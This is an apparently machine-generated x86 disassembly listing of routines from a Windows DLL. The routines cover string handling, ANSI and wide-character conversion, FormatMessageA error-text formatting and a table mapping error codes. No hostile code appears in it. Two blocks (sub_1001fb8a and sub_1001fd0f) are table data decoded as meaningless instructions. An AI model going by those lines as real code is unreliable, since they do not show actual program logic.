add esp 0x30
retn 0x8
sub eax ecx
sar eax 0x1
push eax
push ecx
lea ecx [ esp + 0x14 ]
mov [ esp + 0x2c ] 0x7
mov [ esp + 0x28 ] edx
mov [ esp + 0x18 ] dx
call sub_1000155d
mov [ esp + 0x34 ] 0x1
call sub_1001ec70
mov ecx [ esp + 0x24 ]
mov eax [ esp + 0x10 ]
mov edx eax
cmp ecx 0x8
jae r-xdata
mov ecx [ esp + 0x20 ]
lea edx [ edx + ecx * 2 ]
push edx
push eax
mov ecx esi
call sub_1000d357
cmp [ esp + 0x24 ] 0x8
jb r-xdata
lea edx [ esp + 0x10 ]
mov eax edx
mov eax [ esp + 0x10 ]
push eax
call sub_1002004f
add esp 0x4
sub_1001ee80
push 0xffffffff
push sub_100477cb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x3c
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x50 ]
mov [ fs : 0x0 ] eax
mov esi ecx
xor ebp ebp
mov [ esp + 0x14 ] ebp
call sub_1001e240
cmp eax 0xffffffff
jne r-xdata
mov edi [ esi + 0x18 ]
lea ecx [ esi + 0x4 ]
cmp edi 0x8
jb r-xdata
mov edi 0x7
xor eax eax
mov [ esp + 0x4c ] edi
mov [ esp + 0x48 ] ebp
mov [ esp + 0x38 ] ax
lea eax [ esp + 0x34 ]
lea ebx [ ebp + 0x1 ]
jmp r-xdata
mov edx ecx
mov edx [ ecx ]
jmp r-xdata
mov esi [ esp + 0x60 ]
push 0xffffffff
xor ecx ecx
mov [ esi + 0x18 ] edi
mov [ esi + 0x14 ] ebp
push ebp
mov [ esi + 0x4 ] cx
push eax
mov ecx esi
mov [ esp + 0x20 ] ebx
mov [ esp + 0x64 ] ebx
call sub_10002033
or ebx 0x4
test bl 0x2
je r-xdata
lea edx [ edx + eax * 2 ]
push edx
push ecx
lea ecx [ esp + 0x20 ]
call sub_1001eda0
mov ebx 0x2
mov edi 0x7
mov ecx [ ecx ]
cmp edi 0x8
jb r-xdata
test bl 0x1
je r-xdata
and ebx 0xfffffffd
cmp [ esp + 0x30 ] 0x8
jb r-xdata
mov eax esi
mov ecx [ esp + 0x50 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x48
retn 0x4
cmp [ esp + 0x4c ] 0x8
jb r-xdata
xor eax eax
mov [ esp + 0x30 ] edi
mov [ esp + 0x2c ] ebp
mov [ esp + 0x1c ] ax
mov edx [ esp + 0x1c ]
push edx
call sub_1002004f
add esp 0x4
mov ecx [ esp + 0x38 ]
push ecx
call sub_1002004f
add esp 0x4
sub_1001ef90
push 0xffffffff
push sub_10047800
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x30 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov edx [ esp + 0x48 ]
xor ebx ebx
mov eax edx
mov [ esp + 0x2c ] 0xf
mov [ esp + 0x28 ] ebx
mov [ esp + 0x18 ] bl
lea edi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
push eax
push edx
lea ecx [ esp + 0x1c ]
call sub_100024af
lea eax [ esp + 0x14 ]
push eax
mov ecx esi
mov [ esp + 0x3c ] ebx
call sub_10001d6b
cmp [ esp + 0x2c ] 0x10
jb r-xdata
mov eax [ esp + 0x44 ]
mov edx [ esp + 0x40 ]
mov [ esi ] r--data
mov [ esi + 0x2c ] eax
mov [ esi + 0x28 ] edx
mov [ esi + 0x48 ] 0xf
mov [ esi + 0x44 ] ebx
mov [ esi + 0x34 ] bl
mov eax esi
mov ecx [ esp + 0x30 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
add esp 0x2c
retn 0xc
mov ecx [ esp + 0x18 ]
push ecx
call sub_1002004f
add esp 0x4
sub_1001f050
push ebx
push ebp
push esi
push edi
mov edi ecx
mov edx [ edi + 0x18 ]
lea esi [ edi + 0x4 ]
cmp edx 0x10
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
call sub_1002059f
cmp edx 0x10
jb r-xdata
mov ecx [ edi + 0x14 ]
lea ebp [ ecx + eax ]
test ebp ebp
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
call sub_1002059f
cmp edx 0x10
jb r-xdata
mov ecx [ edi + 0x14 ]
lea ebx [ ecx + eax ]
test ebx ebx
je r-xdata
cmp edx 0x10
jb r-xdata
cmp eax ebp
ja r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp edx 0x10
jb r-xdata
cmp eax ebx
ja r-xdata
mov edx [ edi + 0x18 ]
cmp edx 0x10
jb r-xdata
add ecx eax
cmp ebp ecx
jbe r-xdata
add ecx esi
cmp ebx ecx
jbe r-xdata
mov esi [ esi ]
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
push eax
push ecx
push edx
push ebp
push edi
push ebx
push edi
mov ecx edi
call sub_10012dc4
pop edi
pop esi
pop ebp
pop ebx
retn 0xc
sub_1001f0f0
sub esp 0x54
mov ecx [ esp + 0x6c ]
mov eax [ ecx ]
mov eax [ eax + 0x14 ]
push esi
push edi
mov edi [ esp + 0x68 ]
lea edx [ esp + 0x74 ]
push edx
mov edx [ esp + 0x70 ]
push edx
push edi
lea edx [ esp + 0x18 ]
push edx
mov edx [ esp + 0x74 ]
push edx
mov edx [ esp + 0x74 ]
push edx
lea edx [ esp + 0x20 ]
push edx
mov [ esp + 0x24 ] 0x0
call eax
mov esi eax
test esi esi
je r-xdata
mov edx [ esp + 0x74 ]
mov eax [ esp + 0x74 ]
mov ecx [ esp + 0x70 ]
push edx
push eax
push edi
call sub_1001f050
pop edi
pop esi
add esp 0x54
retn
push r--data
call sub_1001f3e0
push eax
push esi
lea ecx [ esp + 0x1c ]
call sub_1001ef90
push r--data
lea ecx [ esp + 0x14 ]
push ecx
call sub_10023a01
sub_1001f170
push 0xffffffff
push sub_1004782b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x110
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x10c ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x124 ]
mov [ fs : 0x0 ] eax
mov esi [ esp + 0x138 ]
mov edi [ esp + 0x13c ]
mov eax [ esp + 0x140 ]
mov ebx [ esp + 0x134 ]
mov [ esp + 0x18 ] edi
mov [ esp + 0x14 ] eax
test esi esi
jne r-xdata
cmp ebx esi
je r-xdata
mov eax ebx
lea edx [ eax + 0x2 ]
jmp r-xdata
mov ecx [ esp + 0x124 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x10c ]
xor ecx esp
call sub_10020040
add esp 0x11c
retn
mov ecx esi
sub ecx ebx
sar ecx 0x1
lea ebp [ ecx * 4 + 0x4 ]
cmp ebp 0x100
jbe r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov edx [ esp + 0x14 ]
push edx
push edi
lea eax [ esp + 0x128 ]
push eax
lea ecx [ esp + 0x2c ]
push ecx
push esi
push ebx
call sub_1001f0f0
add esp 0x18
push ebp
call sub_1001c132
mov edi eax
mov [ esp + 0x20 ] edi
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x1c ]
push edx
push eax
lea ecx [ edi + ebp ]
push ecx
push edi
push esi
push ebx
mov [ esp + 0x148 ] 0x0
call sub_1001f0f0
push edi
call sub_100209c6
add esp 0x20
jmp r-xdata
sub eax edx
sar eax 0x1
lea esi [ ebx + eax * 2 ]
sub_1001f290
push esi
push edi
call [ AreFileApisANSI@IAT ]
mov esi [ esp + 0x1c ]
mov ecx [ esp + 0x20 ]
mov edi [ esp + 0x14 ]
neg eax
sbb eax eax
sub ecx esi
sar ecx 0x1
push ecx
mov ecx [ esp + 0x14 ]
push esi
mov edx edi
sub edx ecx
push edx
push ecx
and eax 0x2
inc eax
push 0x1
push eax
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x24 ]
mov [ ecx ] edi
lea eax [ esi + eax * 2 ]
mov [ edx ] eax
xor ecx ecx
pop edi
mov [ eax ] cx
xor eax eax
pop esi
retn 0x1c
pop edi
mov eax 0x2
pop esi
retn 0x1c
sub_1001f2f0
push esi
push edi
call [ AreFileApisANSI@IAT ]
mov esi [ esp + 0x1c ]
mov ecx [ esp + 0x20 ]
mov edi [ esp + 0x14 ]
push 0x0
neg eax
sbb eax eax
push 0x0
sub ecx esi
push ecx
mov ecx [ esp + 0x1c ]
push esi
mov edx edi
sub edx ecx
sar edx 0x1
push edx
push ecx
and eax 0x2
inc eax
push 0x400
push eax
call [ WideCharToMultiByte@IAT ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x24 ]
add eax esi
mov [ ecx ] edi
mov [ edx ] eax
pop edi
mov [ eax ] 0x0
xor eax eax
pop esi
retn 0x1c
pop edi
mov eax 0x2
pop esi
retn 0x1c
sub_1001f370
mov edx [ esp + 0x4 ]
mov eax [ ecx ]
mov eax [ eax + 0xc ]
sub esp 0x8
push edx
lea edx [ esp + 0x4 ]
push edx
call eax
mov edx [ eax + 0x4 ]
mov ecx [ esp + 0x10 ]
cmp edx [ ecx + 0x4 ]
jne r-xdata
xor eax eax
add esp 0x8
retn 0x8
mov eax [ eax ]
cmp eax [ ecx ]
jne r-xdata
mov eax 0x1
add esp 0x8
retn 0x8
sub_1001f3e0
push 0xffffffff
push sub_1004786e
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov eax 0x1
test [ rw-data ] al
jne r-xdata
mov eax rw-data
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
pop ecx
add esp 0xc
retn
or [ rw-data ] eax
push sub_1004b530
mov [ esp + 0x10 ] 0x0
mov [ rw-data ] r--data
call sub_10024d30
add esp 0x4
sub_1001f450
push 0xffffffff
push sub_100478a9
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x10 ]
mov [ fs : 0x0 ] eax
mov esi [ esp + 0x20 ]
xor eax eax
mov [ esp + 0x8 ] eax
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] eax
mov [ esp + 0xc ] esi
mov [ esi + 0x4 ] al
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x24 ]
mov [ esp + 0x8 ] 0x1
cmp eax 0x3
ja r-xdata
push 0xd
push r--data
jmp [ eax * 4 + jump_table_1001f4f4 ]
push 0x2
push r--data
jmp r-xdata
push 0x7
push r--data
jmp r-xdata
push 0x5
push r--data
jmp r-xdata
push 0x6
push r--data
jmp r-xdata
mov ecx esi
call sub_100024af
mov eax esi
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
add esp 0x14
retn 0x8
sub_1001f560
push 0xffffffff
push sub_100478de
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov eax 0x1
test [ rw-data ] al
jne r-xdata
mov eax rw-data
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
pop ecx
add esp 0xc
retn
or [ rw-data ] eax
push sub_1004b540
mov [ esp + 0x10 ] 0x0
mov [ rw-data ] r--data
call sub_10024d30
add esp 0x4
sub_1001f5d0
push 0xffffffff
push sub_1004790e
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov eax 0x1
test [ rw-data ] al
jne r-xdata
mov eax rw-data
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
pop ecx
add esp 0xc
retn
or [ rw-data ] eax
push sub_1004b550
mov [ esp + 0x10 ] 0x0
mov [ rw-data ] r--data
call sub_10024d30
add esp 0x4
sub_1001f640
push esi
mov esi [ esp + 0xc ]
cmp esi 0x10b
jg r-xdata
cmp esi 0x2714
jg r-xdata
je r-xdata
lea eax [ esi - 0x2719 ]
cmp eax 0x38
ja r-xdata
je r-xdata
call sub_1001f5d0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x16
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
cmp esi 0xd4
ja r-xdata
call sub_1001f560
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] esi
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
movzx edx [ eax + lookup_table_1001fcf0 ]
jmp [ edx * 4 + jump_table_1001fc74 ]
call sub_1001f5d0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x4
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
cmp esi 0x3f5
jg r-xdata
movzx eax [ esi + lookup_table_1001fb78 ]
jmp [ eax * 4 + jump_table_1001fb30 ]
call sub_1001f5d0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_1001f5d0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x18
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_1001f5d0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0xd
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_1001f5d0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26ae
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_1001f5d0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26af
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_1001f5d0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26ad
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_1001f5d0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26b3
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_1001f5d0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x9
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_1001f5d0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26b2
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_1001f5d0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26b4
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_1001f5d0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26b5
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_1001f5d0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26b6
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_1001f5d0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0xe
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_1001f5d0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26b7
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_1001f5d0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26c8
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_1001f5d0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26b0
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_1001f5d0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26b9
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_1001f5d0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26ba
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_1001f5d0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26bb
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_1001f5d0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26bc
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_1001f5d0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26bd
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_1001f5d0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26c1
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_1001f5d0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26c5
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_1001f5d0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26c3
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_1001f5d0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26c9
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_1001f5d0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26cd
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_1001f5d0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26d5
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_1001f5d0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26d2
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_1001f5d0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26ca
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
mov eax esi
sub eax 0x4d5
je r-xdata
je r-xdata
call sub_1001f5d0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x0
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_1001f5d0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x11
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_1001f5d0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x13
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_1001f5d0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x29
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_1001f5d0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x1c
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_1001f5d0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x2
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_1001f5d0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x28
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_1001f5d0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x27
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_1001f5d0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0xc
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_1001f5d0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0xb
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_1001f5d0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x12
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_1001f5d0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x5
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_1001f5d0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x10
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
sub eax 0x48c
je r-xdata
lea eax [ esi - 0x3e3 ]
cmp eax 0x11
ja r-xdata
sub eax 0x3
jne r-xdata
movzx ecx [ eax + lookup_table_1001fc60 ]
jmp [ ecx * 4 + jump_table_1001fc50 ]
call sub_1001f5d0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26c7
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
sub_1001fb8a
adc [ edi + eax ] eax
or [ ecx ] edx
adc [ ecx ] edx
or dl [ ecx ]
adc [ ecx ] edx
or cl [ edx ]
adc [ ebx + ecx ] eax
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx + edx ] ecx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
pop es
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
or eax 0x11110411
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ edx ] ecx
push cs
or al 0x11
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ 0x11111111 ] eax
adc [ ecx ] edx
adc [ 0x11111111 ] eax
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
movups [ ecx ] xmm2
adc [ ecx ] dl
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ edi ] ecx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
or eax 0x11111111
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
or ecx [ ebp - 0x7edffb7 ]
add [ eax ] edx
xchg esp eax
clc
add [ eax ] edx
cli
test [ ecx ] 0x1fb1c10
adc [ eax ] al
add eax [ ebx ]
add [ ebx ] eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ edx ]
add cl [ ebx + 0x1f90cff ]
adc [ eax + edi * 8 - 0x67befff ] dl
add [ eax ] edx
xor edi esi
add [ eax ] edx
test eax 0x41001f7
sti
add [ eax ] edx
mov ah 0xf9
add [ eax ] edx
hlt
sub_1001fd0f
or cl [ ebx ]
or al 0xd
push ds
push cs
push ds
movups xmm2 [ ecx ]
adc dl [ ebx ]
adc al 0x15
push ss
pop ss
sbb [ ecx ] bl
push ds
push ds
sbb bl [ ebx ]
push ds
sbb al 0x1e
sbb eax 0xcccccccc
int3
sub_1001fd30
push 0xffffffff
push sub_10047970
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
push ebx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x2c ]
mov [ fs : 0x0 ] eax
xor ebx ebx
mov [ esp + 0xc ] ebx
test [ rw-data ] 0x1
jne r-xdata
mov eax [ esp + 0x40 ]
push eax
call sub_100275c3
add esp 0x4
test eax eax
je r-xdata
mov eax 0x1
or [ rw-data ] eax
push 0xd
push r--data
mov ecx rw-data
mov [ esp + 0x3c ] eax
mov [ rw-data ] 0xf
mov [ rw-data ] ebx
mov [ rw-data ] bl
call sub_100024af
push sub_1004b560
call sub_10024d30
add esp 0x4
mov [ esp + 0x34 ] bl
mov eax rw-data
mov ecx eax
mov [ esp + 0x28 ] 0xf
mov [ esp + 0x24 ] 0x0
mov [ esp + 0x14 ] 0x0
lea esi [ ecx + 0x1 ]
mov eax esi
mov ecx [ esp + 0x2c ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
add esp 0x2c
retn 0x8
cmp [ esp + 0x28 ] 0x10
jb r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx esi
push ecx
push eax
lea ecx [ esp + 0x18 ]
call sub_100024af
mov ebx 0x1
lea eax [ esp + 0x10 ]
mov [ esp + 0x34 ] 0x2
mov [ esp + 0xc ] ebx
jmp r-xdata
mov ecx [ esp + 0x14 ]
push ecx
call sub_1002004f
add esp 0x4
mov esi [ esp + 0x3c ]
push 0xffffffff
push 0x0
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] 0x0
push eax
mov ecx esi
mov [ esi + 0x4 ] 0x0
call sub_100021b2
or ebx 0x2
test bl 0x1
je r-xdata
sub_1001fe60
push 0xffffffff
push sub_100479b9
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x2c ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x44 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x58 ]
mov edi [ esp + 0x54 ]
xor ebx ebx
push ebx
push ebx
lea eax [ esp + 0x1c ]
push eax
push 0x400
push ecx
push ebx
mov [ esp + 0x30 ] ebx
push 0x1300
mov [ esp + 0x38 ] edi
mov [ esp + 0x30 ] ebx
call [ FormatMessageA@IAT ]
mov ecx [ esp + 0x14 ]
mov ebp ecx
mov [ esp + 0x20 ] ebp
mov esi 0x1
mov [ esp + 0x4c ] esi
cmp eax ebx
jne r-xdata
mov eax ecx
mov [ esp + 0x3c ] 0xf
mov [ esp + 0x38 ] ebx
mov [ esp + 0x28 ] bl
lea esi [ eax + 0x1 ]
push 0xd
mov [ edi + 0x18 ] 0xf
mov [ edi + 0x14 ] ebx
push r--data
mov ecx edi
mov [ edi + 0x4 ] bl
call sub_100024af
mov [ esp + 0x18 ] esi
jmp r-xdata
mov dl [ eax ]
inc eax
cmp dl bl
jne r-xdata
sub eax esi
push eax
push ecx
lea ecx [ esp + 0x2c ]
call sub_100024af
mov eax [ esp + 0x38 ]
mov [ esp + 0x4c ] 0x2
cmp eax ebx
je r-xdata
push ebp
mov [ esp + 0x50 ] bl
call [ LocalFree@IAT ]
mov eax edi
mov ecx [ esp + 0x44 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x2c ]
xor ecx esp
call sub_10020040
add esp 0x3c
retn 0x8
push 0xffffffff
push ebx
lea edx [ esp + 0x2c ]
mov esi 0xf
mov [ edi + 0x18 ] esi
mov [ edi + 0x14 ] ebx
push edx
mov ecx edi
mov [ edi + 0x4 ] bl
call sub_100021b2
cmp [ esp + 0x3c ] 0x10
mov [ esp + 0x18 ] 0x1
jb r-xdata
lea esi [ eax - 0x1 ]
cmp esi eax
jbe r-xdata
mov [ esp + 0x3c ] esi
mov [ esp + 0x38 ] ebx
mov [ esp + 0x28 ] bl
mov eax [ esp + 0x28 ]
push eax
call sub_1002004f
add esp 0x4
cmp [ esp + 0x3c ] 0x10
mov ecx [ esp + 0x28 ]
jae r-xdata
call sub_1002059f
mov eax [ esp + 0x38 ]
cmp [ ecx + esi ] 0xa
je r-xdata
lea ecx [ esp + 0x28 ]
push 0xffffffff
dec eax
push eax
lea ecx [ esp + 0x2c ]
call sub_10002143
mov eax [ esp + 0x38 ]
cmp eax ebx
jne r-xdata
lea esi [ eax - 0x1 ]
cmp esi eax
jbe r-xdata
jmp r-xdata
cmp [ esp + 0x3c ] 0x10
mov ecx [ esp + 0x28 ]
jae r-xdata
call sub_1002059f
mov eax [ esp + 0x38 ]
cmp [ ecx + esi ] 0xd
jne r-xdata
lea ecx [ esp + 0x28 ]
cmp eax ebx
je r-xdata
lea esi [ eax - 0x1 ]
cmp esi eax
jbe r-xdata
cmp [ esp + 0x3c ] 0x10
mov ecx [ esp + 0x28 ]
jae r-xdata
call sub_1002059f
mov eax [ esp + 0x38 ]
cmp [ ecx + esi ] 0x2e
jne r-xdata
lea ecx [ esp + 0x28 ]
push 0xffffffff
dec eax
push eax
lea ecx [ esp + 0x2c ]
call sub_10002143
sub_1002005a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
push edi
xor edi edi
cmp esi edi
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x10 ] edi
je r-xdata
call sub_10026065
push 0x16
pop esi
mov [ eax ] esi
pop edi
pop esi
pop ebp
retn
push [ ebp + 0xc ]
push edi
push [ ebp + 0x8 ]
call sub_100209e0
add esp 0xc
cmp [ ebp + 0x10 ] edi
je r-xdata
cmp [ ebp + 0xc ] esi
jb r-xdata
cmp [ ebp + 0xc ] esi
jae r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_10026940
add esp 0xc
jmp r-xdata
push 0x16
pop eax
call sub_10026065
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_10020579
add esp 0x14
mov eax esi
jmp r-xdata
sub_100200e0
mov ecx [ esp + 0x4 ]
